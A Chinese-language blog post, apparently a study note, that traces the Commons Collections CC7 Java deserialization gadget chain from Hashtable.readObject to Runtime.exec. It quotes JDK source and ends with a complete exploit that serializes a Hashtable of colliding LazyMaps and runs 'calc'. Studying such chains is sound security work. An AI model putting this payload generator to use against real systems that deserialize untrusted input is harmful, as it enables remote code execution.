---
title: java反序列化之CC7
date: 2026-05-20
tags: 
  - java安全
  - 反序列化专题
  - CC链
categories: 
  - web安全
  - java安全
excerpt: java反序列化之CC7
---

# java反序列化之CC7

## CC7 链分析

CC7 的后半段链子和 CC1 是一样的，前半段先看一下 yso 的链子：

```text
java.util.Hashtable.readObject
java.util.Hashtable.reconstitutionPut
org.apache.commons.collections.map.AbstractMapDecorator.equals
java.util.AbstractMap.equals
org.apache.commons.collections.map.LazyMap.get
org.apache.commons.collections.functors.ChainedTransformer.transform
org.apache.commons.collections.functors.InvokerTransformer.transform
java.lang.reflect.Method.invoke
sun.reflect.DelegatingMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke
sun.reflect.NativeMethodAccessorImpl.invoke0
java.lang.Runtime.exec
```

入口类是`Hashtable`，看一下`readObject`方法的源码：

```java
private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the length, threshold, and loadfactor
        s.defaultReadObject();

        // Read the original length of the array and number of elements
        int origlength = s.readInt();
        int elements = s.readInt();

        // Compute new size with a bit of room 5% to grow but
        // no larger than the original size.  Make the length
        // odd if it's large enough, this helps distribute the entries.
        // Guard against the length ending up zero, that's not valid.
        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            // synch could be eliminated for performance
            reconstitutionPut(table, key, value);
        }
    }
```

在最后调用了`Hashtable.reconstitutionPut()`方法，跟进一下：

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        @SuppressWarnings("unchecked")
        Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```

根据 yso 的链子就找到了`equals()`方法，不过也能走`hashCode()`方法，这就回到 CC6 了。然后找到`AbstractMapDecorator`这个类的`equals()`方法：

```java
public boolean equals(Object object) {
        if (object == this) {
            return true;
        }
        return map.equals(object);
    }
```

再来看一下构造器：

```java
protected transient Map map

public AbstractMapDecorator(Map map) {
        if (map == null) {
            throw new IllegalArgumentException("Map must not be null");
        }
        this.map = map;
    }
```

接下来就是找 Map 的实现类。在`AbstractMap`类的`equals()` 方法中发现其调用了 `get()` 方法：

```java
public boolean equals(Object o) {
        if (o == this)
            return true;

        if (!(o instanceof Map))
            return false;
        Map<?,?> m = (Map<?,?>) o;
        if (m.size() != size())
            return false;

        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (ClassCastException unused) {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }

        return true;
    }
```

## CC7 EXP

### LazyMap.get() 部分的 EXP

再复习一下从`LazyMap`开始的 EXP：

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class test {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        lazyMap.get(new HashMap<>());
    }
}
```

### 结合入口类编写 EXP

先来看`reconstitutionPut`方法：

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        @SuppressWarnings("unchecked")
            Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```

这里对传入的`Entry`对象数组进行遍历，并逐个调用`e.key.equals(key)`。再来联系一下`AbstractMap.equals()`：

```java
public boolean equals(Object o) {
        if (o == this)
            return true;

        if (!(o instanceof Map))
            return false;
        Map<?,?> m = (Map<?,?>) o;
        if (m.size() != size())
            return false;

        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (ClassCastException unused) {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }

        return true;
    }
```

如果我们可以控制`e.key.equals(key)`的`key`，就能控制`AbstractMap.equals()`中的`m`。

接下来回到`readObject`方法，再看一次源码：

```java
private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the length, threshold, and loadfactor
        s.defaultReadObject();
    
        int origlength = s.readInt();//Entry数组的元素个数
        int elements = s.readInt();//一个Entry中的键值对个数

        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;
        table = new Entry<?,?>[length];   //新建一个Entry，用来存放反序列化之前的键值对
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();  //反序列化键
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();//反序列化值

            reconstitutionPut(table, key, value);//重构整个Entry
        }
    }
```

根据我的注释就很好理解这段代码的主要部分了：java 是通过新建然后填充从而实现反序列化的，所以对于一个`Hashtable`，反序列化是就是先把整个框架搭建好，然后调用`reconstitutionPut`来填充这个新的`Entry`对象。然后我们再来关注`reconstitutionPut`方法中发生了什么：

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }

        int hash = key.hashCode();//用hashCode计算一下key应该放在什么位置
        int index = (hash & 0x7FFFFFFF) % tab.length;
    
    	//遍历这个位置上的链表，检查是否有重复
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            
            //先满足hash相同，然后equals返回true,则认为键重复
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // 没有重复就创建新的Entry并放入链表头部
        @SuppressWarnings("unchecked")
        Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```

根据我的注释，大致能理解这个函数的具体运行逻辑了。

我们来看一下，如果我们只在`Hashtable`中放一个键值对，传入`reconstitutionPut`方法的`Entry`对象就是空，for 循环根本进不去，所以无法触发`equals`方法。

如果我们放两个键值对，在第一个键值对传入后`e`这个`Entry`对象已经存了第一个键值对，然后第二次调用`reconstitutionPut`方法的时候`tab`就有了第一个键值对，然后计算第二个键的哈希，如果第二个哈希和第一个哈希是一样的，就会调用`equals`。

这也是为什么 yso 的链子中会放两个`LazyMap`且存放在`LazyMap`的键分别为`yy`和`zZ`。

当我们把两个`LazyMap`放到`Hashtable`中后，`e.key`就是第一个`LazyMap`，此时就会调用`LazyMap`的`equals`方法，但是这个方法`LazyMap`没有实现，所以就去调用了父类`AbstractMapDecorator`的`equals`方法：

```java
public boolean equals(Object object) {
        if (object == this) {
            return true;
        }
        return map.equals(object);
    }
```

这里调用了`map`属性的`equals`方法，关注一下这个`map`属性，在`LazyMap`被实例化时已经给`map`属性赋值了：

```java
protected LazyMap(Map map, Factory factory) {
        super(map);//给map赋值
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        }
        this.factory = FactoryTransformer.getInstance(factory);
    }
```

```java
public AbstractMapDecorator(Map map) {
        if (map == null) {
            throw new IllegalArgumentException("Map must not be null");
        }
        this.map = map;
    }
```

而在我们构造第一个`LazyMap`时，第一个参数是一个普通的`HashMap`，所以就变成了`HashMap.equals(lazyMap2)`。而`HashMap`也没有重写`equals`方法，所以就会调用父类`AbstractMap`的`equals`方法，所以就变成了`AbstractMap.equals(lazyMap2)`。

```java
public boolean equals(Object o) {
        if (o == this)
            return true;

        if (!(o instanceof Map))
            return false;
        Map<?,?> m = (Map<?,?>) o;   //注意这里！！！
        if (m.size() != size())
            return false;

        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (ClassCastException unused) {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }

        return true;
    }
```

此时传入的`lazyMap2`就赋值给了变量`m`，在后续就调用了`LazyMap`的`get`方法，实现了整个链子。

但至此还有一个问题，在 yso 的链子中，还把一开始的`yy`给删除了。

回到序列化之前，我们要把两个`LazyMap`放到`Hashtable`中，代码大致为：

```java
Hashtable ht = new Hashtable();
ht.put(lazyMap1, "value1");   // 第一步
ht.put(lazyMap2, "value2");   // 第二步
```

问题就在第二步上。

根据上面的分析，`Hashtable`内部会进行`lazyMap2.equals(lazyMap1)` 来判断键是否重复，从而触发`lazyMap1`内部的`HashMap`比较`lazyMap2`，从而调用`lazyMap2.get("yy")`。而`LazyMap.get()`中有一个逻辑：如果没有这个键，就调用`factory.transform(key)`并进行`map.put(key, value)`操作，也就是会把`yy`存放到`LazyMap`内部的`HashMap`中。这样我们的`lazyMap2`中就有两个键值对：`"zZ"->1`和`"yy"->某个值`，这样在反序列化重建时，在进行`HashMap.equals`时会查找`lazyMap2`，如果不删除，`lazyMap2`中有`yy`这个键，此时调用`lazyMap2.get`时其中的条件`map.containsKey(key) == false`就不满足，就不会调用到其中的`factory.transform(key)`，这样链子就断了。所以当我们`put`完成之后，就会删除`lazyMap2`的`yy`。

**完整 EXP**：

```java
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class test {

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        Map lazyMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        lazyMap1.put("yy",1);
        Map lazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
        lazyMap2.put("zZ",1);
        //lazyMap.get(new HashMap<>());

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(lazyMap1,1);
        hashtable.put(lazyMap2,1);

        lazyMap2.remove("yy");

        serialize(hashtable);
        unserialize("ser.bin");
    }
}
```

## 总结

感觉这条链子的各种变量传递很绕，得多看看。这也让我想到一个项目思路：搞一个 java 反编译器，同时能够导出为 maven 和 gradle 项目，这样以后做到 java web 的题目就不用很麻烦的搭建题目环境了，然后再搞一个 java hook，这样追踪变量传递就很轻松了，不用花脑子想半天。























